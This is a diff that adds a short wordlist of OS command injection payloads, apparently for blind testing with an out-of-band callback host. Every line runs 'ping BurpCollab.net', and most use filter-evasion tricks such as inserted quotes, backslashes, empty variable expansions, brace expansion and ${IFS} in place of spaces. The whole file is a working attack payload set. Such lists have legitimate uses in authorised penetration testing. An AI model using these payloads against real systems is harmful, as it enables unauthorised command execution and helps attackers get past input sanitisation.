@@ -1,0 +1,16 @@
+ping BurpCollab.net
+p[i]n[g] BurpCollab.net
+'p'i'n'g BurpCollab.net
+pi''ng BurpCollab.net
+"p"i"n"g BurpCollab.net
+p""ing BurpCollab.net
+\p\i\n\g BurpCollab.net
+/\p/i//\n/g BurpCollab.net
+ping$u BurpCollab.net
+ping${u} BurpCollab.net
+ping$(u) BurpCollab.net
+p$(u)i$(u)n$(u)g BurpCollab.net
+p'u'i'u'n'u'g BurpCollab.net
+{ping,BurpCollab.net}
+ping${IFS}BurpCollab.net
+ping$IFSBurpCollab.net
